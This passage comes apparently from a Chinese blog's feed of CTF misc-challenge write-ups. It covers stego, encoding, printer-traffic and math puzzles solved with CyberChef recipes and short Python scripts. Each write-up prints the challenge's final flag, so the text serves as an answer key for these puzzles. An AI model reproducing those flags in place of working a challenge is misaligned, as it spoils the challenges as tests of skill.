CyberChef Receipt 处理即可得到含有 flag 的字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL_Decode()</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;^i(.*)&amp;kcahsni&#x3D;&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;,(.*)$\\n&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">From_Hex(&#39;Auto&#39;)</span><br><span class="line">Reverse(&#39;Character&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;b274dddb2c7707ebe430dadcf1245c246713502d6e9579f00acd10a83f3da95e&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2019-Crunchy"><a href="#INSHack2019-Crunchy" class="headerlink" title="[INSHack2019]Crunchy"></a>[INSHack2019]Crunchy</h3><p>附件给出的代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crunchy</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>: <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> <span class="number">6</span> * crunchy(n - <span class="number">1</span>) + crunchy(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">g = <span class="number">17665922529512695488143524113273224470194093921285273353477875204196603230641896039854934719468650093602325707751568</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Your flag is: INSA&#123;%d&#125;&quot;</span>%(crunchy(g)%<span class="number">100000007</span>))</span><br></pre></td></tr></table></figure><p>由于数字太大导致递归超出了范围，尝试用 SageMath 来解出。SageMath 中提供了一个包可以用来快速算出斐波那契数列。</p><blockquote><p><a href="https://doc.sagemath.org/html/en/reference/combinat/sage/combinat/binary_recurrence_sequences.html">https://doc.sagemath.org/html/en/reference/combinat/sage/combinat/binary_recurrence_sequences.html</a></p></blockquote><p>此时只需要写个脚本解出答案即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g = <span class="number">17665922529512695488143524113273224470194093921285273353477875204196603230641896039854934719468650093602325707751568</span></span><br><span class="line">modNum = <span class="number">100000007</span></span><br><span class="line">binaryRecurrenceSequence = BinaryRecurrenceSequence(<span class="number">6</span>, <span class="number">1</span>)</span><br><span class="line">period = binaryRecurrenceSequence.period(modNum)</span><br><span class="line"><span class="built_in">print</span>(binaryRecurrenceSequence(g % period) % modNum)</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619781699640.51fec9fdb628f17abfff1e39c0ff74afa1457d27.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;41322239&#125;</span><br></pre></td></tr></table></figure><h3 id="WMCTF2020-行为艺术"><a href="#WMCTF2020-行为艺术" class="headerlink" title="[WMCTF2020]行为艺术"></a>[WMCTF2020]行为艺术</h3><p>附件给出了一张图片，010 打开运行模板得到 CRC Mismatch 提示后根据 <code>hex: 0x380 0x284</code> 修正其高度，即可得到下图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619783064801.3ffc54440bf441f4c148ba8cecb921cf5b035da1.png"></p><p>略微读一下内容很容易发现图片的数字中有一个压缩文档，将图片内容转写下来得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>使用如下的 CyberChef Receipt 可得到下一步的信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">From_Hex(&#39;None&#39;)</span><br><span class="line">Unzip(&#39;&#39;,false)</span><br><span class="line">Decode_text(&#39;UTF-8 (65001)&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Good eyes! Here is your flag:</span><br><span class="line">https:&#x2F;&#x2F;www.splitbrain.org&#x2F;services&#x2F;ook</span><br><span class="line"></span><br><span class="line">+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .&lt;+++ [-&gt;-- -&lt;]&gt;-</span><br><span class="line">.&lt;+++ +[-&gt;+ +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++</span><br><span class="line">++.-- --.&lt;+ +++[- &gt;---- &lt;]&gt;-- ----. +++++ +++.&lt; +++[- &gt;---&lt; ]&gt;-.+ ++.++</span><br><span class="line">+++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .+++. -.... --.++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++++. &lt;++++</span><br><span class="line">++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- --.&lt;+ +++[- &gt;++++ &lt;]&gt;+. +...&lt; +++++</span><br><span class="line">+++[- &gt;++++ ++++&lt; ]&gt;+++ +++++ +++.. .-.&lt;</span><br></pre></td></tr></table></figure><p>使用信息中的网站进行 Brainfuck to Text 可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMCTF&#123;wai_bi_baaaa_bo!2333~~~&#125;</span><br></pre></td></tr></table></figure><h3 id="羊城杯-2020-逃离东南亚"><a href="#羊城杯-2020-逃离东南亚" class="headerlink" title="[羊城杯 2020]逃离东南亚"></a>[羊城杯 2020]逃离东南亚</h3><p>附件解压后得到三个日记压缩文档，第一个打开后有一张图片。010 editor 打开后可知需要修复图片宽高。将其依照脚本爆破结果 <code>hex: 0xf9 0x12c</code> 修复后可得下图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619784523989.9dd75ab600acad5e77d2d49666fbbf7e92b5f96b.png" alt="image-20210430200843458"></p><p>将 <code>wdnmd</code> 作为压缩包密码解压日记 2 压缩文档可得一串 Brainfuck 和一个音频。在 Brainfuck 前面补充上 8 个 <code>+</code> 即可解码成功并得到一串 Base64。使用 CyberChef 解码后检测文件类型可知其是一个 ELF 文件。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File type:   Executable and Linkable Format</span><br><span class="line">Extension:   elf,bin,axf,o,prx,so</span><br><span class="line">MIME type:   application&#x2F;x-executable</span><br><span class="line">Description: Executable and Linkable Format file. No standard file extension.</span><br></pre></td></tr></table></figure><p>将其用 IDA 打开可以得到如下源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hei~what you want??&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;want a flag? &quot;</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sorry~there is no flag&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;but maybe your can find something useful!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>音频中考虑存在隐写，因此尝试使用 SilentEye 尝试 Decode，得到了如下信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619785170884.0fff21ffad708894d53adce50bf0f09b4510612e.png"></p><p>使用 <code>This1sThe3rdZIPpwd</code> 作为密码解压日记 3。可以得到一份日记和 libc 的源码。从 NEWS 中可以得到版本信息 <code>Version 2.28</code>。从 GitHub 上下载对应的源码，然后用 Diff Merge 做比对。根据日记中的暗示可以知道信息留存在代码中，因此比对一下更改即可。</p><blockquote><p><a href="https://github.com/bminor/glibc/tree/3c03baca37fdcb52c3881e653ca392bba7a99c2b">https://github.com/bminor/glibc/tree/3c03baca37fdcb52c3881e653ca392bba7a99c2b</a></p></blockquote><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619801149914.5fe37a86d125627e668512ba8efb9f780d0dbaca.png"></p><p>可以发现有一个文件的代码里增加了很多空格。此时再换到 Beyond Compare 比对一下可以得到如下结果，猜测这些空格中确实隐藏了信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619802917513.76c172704eed10ca2c598d0a31f80221c78d3029.png"></p><p>使用如下的 CyberChef Receipt 可以得到其中的信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Diff(&#39;\\n\\n\\n\\n\\n&#39;,&#39;Character&#39;,true,true,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39; &#39;&#125;,&#39;0&#39;,true,false,false,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\t&#39;&#125;,&#39;1&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\n&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;000000000&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">From_Binary(&#39;None&#39;,8)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Extract from arena.c</span><br><span class="line">your flag is in malloc.c</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Extract from rtld.c</span><br><span class="line">SOS! please help me -&gt; rtld.c</span><br></pre></td></tr></table></figure><p>对 malloc.c 提取信息可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GWCTF&#123;code_steganography_1s_funny!&#125;</span><br></pre></td></tr></table></figure><h3 id="RCTF2019-printer"><a href="#RCTF2019-printer" class="headerlink" title="[RCTF2019]printer"></a>[RCTF2019]printer</h3><p>Wireshark 分析流量包，可得如下内容，</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">BAR 348, 439, 2, 96 </span><br><span class="line">BAR 292, 535, 56, 2 </span><br><span class="line">BAR 300, 495, 48, 2 </span><br><span class="line">BAR 260, 447, 2, 88 </span><br><span class="line">BAR 204, 447, 56, 2 </span><br><span class="line">BAR 176, 447, 2, 96 </span><br><span class="line">BAR 116, 455, 2, 82 </span><br><span class="line">BAR 120, 479, 56, 2 </span><br><span class="line">BAR 44, 535, 48, 2 </span><br><span class="line">BAR 92, 455, 2, 80 </span><br><span class="line">BAR 20, 455, 72, 2 </span><br><span class="line">BAR 21, 455, 2, 40 </span><br><span class="line">BAR 21, 495, 24, 2 </span><br><span class="line">BAR 45, 479, 2, 16 </span><br><span class="line">BAR 36, 479, 16, 2 </span><br><span class="line">BAR 284, 391, 40, 2 </span><br><span class="line">BAR 324, 343, 2, 48 </span><br><span class="line">BAR 324, 287, 2, 32 </span><br><span class="line">BAR 276, 287, 48, 2 </span><br><span class="line">BAR 52, 311, 48, 2 </span><br><span class="line">BAR 284, 239, 48, 2 </span><br><span class="line">BAR 308, 183, 2, 56 </span><br><span class="line">BAR 148, 239, 48, 2 </span><br><span class="line">BAR 196, 191, 2, 48 </span><br><span class="line">BAR 148, 191, 48, 2 </span><br><span class="line">BAR 68, 191, 48, 2 </span><br><span class="line">BAR 76, 151, 40, 2 </span><br><span class="line">BAR 76, 119, 2, 32 </span><br><span class="line">BAR 76, 55, 2, 32 </span><br><span class="line">BAR 76, 55, 48, 2 </span><br><span class="line">BAR 112, 535, 64, 2 </span><br><span class="line">BAR 320, 343, 16, 2 </span><br><span class="line">BAR 320, 319, 16, 2 </span><br><span class="line">BAR 336, 319, 2, 24 </span><br><span class="line">BAR 56, 120, 24, 2 </span><br><span class="line">BAR 56, 87, 24, 2 </span><br><span class="line">BAR 56, 88, 2, 32 </span><br><span class="line">BAR 224, 247, 32, 2 </span><br><span class="line">BAR 256, 215, 2, 32 </span><br><span class="line">BAR 224, 215, 32, 2 </span><br><span class="line">BAR 224, 184, 2, 32 </span><br><span class="line">BAR 224, 191, 32, 2 </span><br><span class="line">BAR 272, 311, 2, 56 </span><br><span class="line">BAR 216, 367, 56, 2 </span><br><span class="line">BAR 216, 319, 2, 48 </span><br><span class="line">BAR 240, 318, 2, 49 </span><br><span class="line">BAR 184, 351, 2, 16 </span><br><span class="line">BAR 168, 351, 16, 2 </span><br><span class="line">BAR 168, 311, 2, 40 </span><br><span class="line">BAR 152, 351, 16, 2 </span><br><span class="line">BAR 152, 351, 2, 16</span><br></pre></td></tr></table></figure><p>根据提示可找到打印机的文档。</p><blockquote><p><a href="http://www.kroyeuropedownload.com/English_User_Manuals/TSPL_TSPL2_Programming_Jan_2017.pdf">http://www.kroyeuropedownload.com/English_User_Manuals/TSPL_TSPL2_Programming_Jan_2017.pdf</a></p></blockquote><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619857758744.c0f6f3dcad14151a48e8e3c518c2b0281178029b.png"></p><p>根据规则使用 Python 将图片画出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">barcmds = [cmd.replace(<span class="string">&quot;BAR&quot;</span>, <span class="string">&quot;&quot;</span>).strip().split(<span class="string">&quot;,&quot;</span>) <span class="keyword">for</span> cmd <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;barcmds&quot;</span>, <span class="string">&quot;r&quot;</span>).readlines()]</span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">500</span>, <span class="number">600</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> barcmds:</span><br><span class="line">    bar = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="built_in">int</span>(cmd[<span class="number">2</span>]), <span class="built_in">int</span>(cmd[<span class="number">3</span>])), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>))</span><br><span class="line">    image.paste(bar, (<span class="built_in">int</span>(cmd[<span class="number">0</span>]), <span class="built_in">int</span>(cmd[<span class="number">1</span>])))</span><br><span class="line">image = image.rotate(<span class="number">180</span>)</span><br><span class="line">image.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619863407310.69df5e90d7fbc0e9c714544ecf43ef43aef09db9.png@300w" alt="image-20210501180326759"></p><p>流量中还包含了 bitmap 的数据，根据文档中的描述可知其结构。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619864785244.54cb2b6ee5a0f0cf7d05d146f9e22c74635f9366.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619864866827.52fa39cdcccc3ab704b2d2bd168a845f6fb4c445.png"></p><p>因此将指定部分数据提取出来后用如下 CyberChef Receipt 处理即可得到剩下部分的 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">From_Hex(&#39;Auto&#39;)</span><br><span class="line">To_Binary(&#39;None&#39;,8)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;0&#39;&#125;,&#39;\\x00&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;1&#39;&#125;,&#39;\\xff&#39;,true,false,true,false)</span><br><span class="line">Generate_Image(&#39;Greyscale&#39;,1,208)</span><br><span class="line">Rotate_Image(180)</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619865002536.ac6f30af5426ef86b05724805d8c552883fe18b8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;my_tsc_hc3pnikdk&#125;</span><br></pre></td></tr></table></figure><h3 id="b01lers2020-matryoshka"><a href="#b01lers2020-matryoshka" class="headerlink" title="[b01lers2020]matryoshka"></a>[b01lers2020]matryoshka</h3><p>附件给出的图片中有不同向的草莓，使用脚本将数据处理一下然后使用 CyberChef 重新渲染图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;matryoshka.png&quot;</span>)</span><br><span class="line">offset = <span class="number">12</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(offset, image.width, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(offset, image.height, <span class="number">50</span>):</span><br><span class="line">        (r, g, b) = image.getpixel((x, y))</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span> <span class="keyword">if</span> r != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>, end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;1&#39;&#125;,&#39;\\xFF&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;0&#39;&#125;,&#39;\\x00&#39;,true,false,true,false)</span><br><span class="line">Generate_Image(&#39;Greyscale&#39;,2,121)</span><br></pre></td></tr></table></figure><p>得到了一个二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619867652603.70d38bbeaf26cff1eb1ea7931979e516427a2552.png"></p><p>使用如下工具扫描可得一个 GZIP 文件。</p><blockquote><p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p></blockquote><p>使用如下的 CyberChef Receipt 处理可以得到一个二维码。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">From_Hexdump()</span><br><span class="line">Gunzip()</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;l&#39;&#125;,&#39;\\xFF&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;1&#39;&#125;,&#39;\\x00&#39;,true,false,true,false)</span><br><span class="line">Generate_Image(&#39;Greyscale&#39;,2,86)</span><br></pre></td></tr></table></figure><p>再次扫描得出的二维码后用如下 CyberChef Receipt 处理可得到又一个二维码。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">From_Hexdump()</span><br><span class="line">Render_Image(&#39;Raw&#39;)</span><br><span class="line">Invert_Image()</span><br></pre></td></tr></table></figure><p>再次扫描二维码后可得一个 7z 文件的数据，稍微处理后将其打开。使用弱密码尝试可得压缩包密码为 1234。将压缩包解压即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pctf&#123;dolls_do_get_boring_after_a_while&#125;</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-OI的梦"><a href="#NPUCTF2020-OI的梦" class="headerlink" title="[NPUCTF2020]OI的梦"></a>[NPUCTF2020]OI的梦</h3><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619874114080.cc1b99f63ca59054e8a407ed8779a7635bceab28.png"></p><p>矩阵快速幂可以解决，很容易找到如下代码示例。稍微修改一下示例的代码。</p><blockquote><p><a href="https://blog.csdn.net/bianxia123456/article/details/105167294/">https://blog.csdn.net/bianxia123456/article/details/105167294/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mulMatrix</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    ans = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">                ans[i][j] += x[i][k] * y[k][j]</span><br><span class="line">                ans[i][j] %= <span class="number">10003</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quickMatrix</span>(<span class="params">m, n</span>):</span></span><br><span class="line">    E = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">        E[i][i] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (n):</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            E = mulMatrix(E, m)</span><br><span class="line">        m = mulMatrix(m, m)</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">matrix = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)]</span><br><span class="line">dataIn = <span class="built_in">open</span>(<span class="string">&quot;yyh.in&quot;</span>, <span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">n, m, steps = dataIn[<span class="number">0</span>].strip().split()</span><br><span class="line">m = <span class="built_in">int</span>(m)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, m):</span><br><span class="line">    i, j = dataIn[x + <span class="number">1</span>].strip().split()</span><br><span class="line">    i = <span class="built_in">int</span>(i)</span><br><span class="line">    j = <span class="built_in">int</span>(j)</span><br><span class="line">    matrix[i][j] = <span class="number">1</span></span><br><span class="line">    matrix[j][i] = <span class="number">1</span></span><br><span class="line">ans = quickMatrix(matrix, <span class="built_in">int</span>(steps))</span><br><span class="line"><span class="built_in">print</span>(ans[<span class="number">1</span>][<span class="built_in">int</span>(n)])</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5174&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UNCTF 2020</title>
      <link href="/zh-CN/posts/774f8257.html"/>
      <url>/zh-CN/posts/774f8257.html</url>
      
